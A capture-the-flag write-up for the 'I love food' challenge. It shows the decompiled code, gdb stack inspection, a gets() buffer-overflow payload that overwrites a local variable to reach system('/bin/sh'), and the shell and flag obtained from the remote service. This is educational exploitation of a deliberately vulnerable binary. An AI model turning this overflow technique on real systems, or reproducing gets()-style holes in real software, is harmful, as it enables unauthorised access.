# I love food !

Subject :

```md
I made a program to know more about the tastes of the players, what's your favorite food ? :)

http://internetcest.fun:13338
```

We've been given [this binary](./i_love_food). Let's try it out :

```console
$ ./i_love_food 
What is your favorite dish ? 
test
Interesting... Mine is DEADBEEF :) 
```

The program is asking for an input, and exiting. Let's explore the code.

## Static analysis

Using ghidra we can find those functions :

```C
undefined8 main(void)
{
  setup();
  vuln();
  return 0;
}

void vuln(void)
{
  char local_38 [44];
  uint local_c;
  
  local_c = 0xdeadbeef;
  puts("What is your favorite dish ? ");
  gets(local_38);
  if (local_c == 0xf00df00d) {
    puts("Damn that\'s a good one !");
    system("/bin/sh");
  }
  else {
    printf("Interesting... Mine is %X :)",(ulong)local_c);
  }
  return;
}
```

We want to execute the command `system("/bin/sh");` in the vuln() function to get a shell. To do so we'll need to pass this condition : `if (local_c == 0xf00df00d)`.  
  
To achieve this, we'll modify the local_c variable by exploiting the gets() function which is vulnerable to a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow).

## Dynamic analysis

Let's find out how many bytes we need to send to modify local_c using gdb.  
  
First, we'll add a breakpoint (gdb will stop everytime the program reaches this instruction) after the gets() function is called. To do so, we'll disassemble the vuln() function and look for the instruction calling gets() :

```gdb
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0000000000001194 <+0>:	push   %rbp
   0x0000000000001195 <+1>:	mov    %rsp,%rbp
   0x0000000000001198 <+4>:	sub    $0x30,%rsp
   0x000000000000119c <+8>:	movl   $0xdeadbeef,-0x4(%rbp)
   0x00000000000011a3 <+15>:	lea    0xe5a(%rip),%rax        # 0x2004
   0x00000000000011aa <+22>:	mov    %rax,%rdi
   0x00000000000011ad <+25>:	call   0x1030 <puts@plt>
   0x00000000000011b2 <+30>:	lea    -0x30(%rbp),%rax
   0x00000000000011b6 <+34>:	mov    %rax,%rdi
   0x00000000000011b9 <+37>:	mov    $0x0,%eax
   0x00000000000011be <+42>:	call   0x1070 <gets@plt>
   0x00000000000011c3 <+47>:	cmpl   $0xf00df00d,-0x4(%rbp)
   0x00000000000011ca <+54>:	jne    0x11ec <vuln+88>
   0x00000000000011cc <+56>:	lea    0xe4f(%rip),%rax        # 0x2022
   0x00000000000011d3 <+63>:	mov    %rax,%rdi
   0x00000000000011d6 <+66>:	call   0x1030 <puts@plt>
   0x00000000000011db <+71>:	lea    0xe59(%rip),%rax        # 0x203b
   0x00000000000011e2 <+78>:	mov    %rax,%rdi
   0x00000000000011e5 <+81>:	call   0x1050 <system@plt>
   0x00000000000011ea <+86>:	jmp    0x1205 <vuln+113>
   0x00000000000011ec <+88>:	mov    -0x4(%rbp),%eax
   0x00000000000011ef <+91>:	mov    %eax,%esi
   0x00000000000011f1 <+93>:	lea    0xe4b(%rip),%rax        # 0x2043
   0x00000000000011f8 <+100>:	mov    %rax,%rdi
   0x00000000000011fb <+103>:	mov    $0x0,%eax
   0x0000000000001200 <+108>:	call   0x1060 <printf@plt>
   0x0000000000001205 <+113>:	nop
   0x0000000000001206 <+114>:	leave
   0x0000000000001207 <+115>:	ret
End of assembler dump.
(gdb) break *vuln+47
Breakpoint 1 at 0x11c3
```

According to our static analysis, the variable used to store the user input is of 44 bytes : `char local_38 [44];`. Let's fill this variable by using python to send 44 characters (we'll use "\x41" which is an `A` in ascii), and then inspect the stack to see how many bytes we need to send before writing over local_c :

```gdb
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44)')
Starting program: /home/coucou/Documents/I_love_food/i_love_food <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What is your favorite dish ? 

Breakpoint 1, 0x00005555555551c3 in vuln ()
(gdb) x/20wx $rsp
0x7fffffffda20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda40:	0x41414141	0x41414141	0x41414141	0xdeadbe00
0x7fffffffda50:	0xffffda70	0x00007fff	0x5555522b	0x00005555
0x7fffffffda60:	0xffffdb88	0x00007fff	0x00000000	0x00000001
```

The rsp (Register Stack Pointer) is a register that points to the top of the current stack. So by using the `x/20wx $rsp` instruction, we can inspect the current stack.  
In the stack, we can easily spot the 44 "\x41" we gave to the program, and we can see a 0xdeadbe00 value right next to it. During our static analysis, we found `local_c = 0xdeadbeef;`, which means that the local_c variable is stored right after the user input. Let's write over it by adding "\x0d\xf0\x0d\xf0" after our previous input (being on a [little endian system](https://en.wikipedia.org/wiki/Endianness) we write over memory in reverse) :

```gdb
(gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")')
Starting program: /home/coucou/Documents/I_love_food/i_love_food <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
What is your favorite dish ? 

Breakpoint 1, 0x00005555555551c3 in vuln ()
```

Now let's inspect the stack :

```gdb
(gdb) x/20wx $rsp
0x7fffffffda20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda40:	0x41414141	0x41414141	0x41414141	0xf00df00d
0x7fffffffda50:	0xffffda00	0x00007fff	0x5555522b	0x00005555
0x7fffffffda60:	0xffffdb88	0x00007fff	0x00000000	0x00000001
```

We can see that the local_c variable has been modified. Let's resume execution and see what happens :

```gdb
(gdb) continue
Continuing.
Damn that's a good one !
[Detaching after vfork from child process 4655]

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

The program does reach the success message and open another process.  
  
Let's test our payload on the binary using the intruction `(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee)` to send our payload, and then freeze the shell before it closes :

```console
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
What is your favorite dish ? 

Damn that's a good one !
whoami
coucou
ls
exploit.py  i_love_food  README.md
```

We've successfully opened a shell, so the final payload is : `"\x41"*44+"\x0d\xf0\x0d\xf0"`.

## Exploit

Now let's connect to the service and send our payload. To do so, we'll use [this script](./exploit.py) :

```console
$ python3 exploit.py                                                                              
b"What is your favorite dish ? \nDamn that's a good one !\n"
whoami
b'root\n'
ls
b'flag.txt\ni_love_food\ni_love_food.c\n'
cat flag.txt
b'FLAG{I_JU5T_L1K3_F00D!!}\n'
```
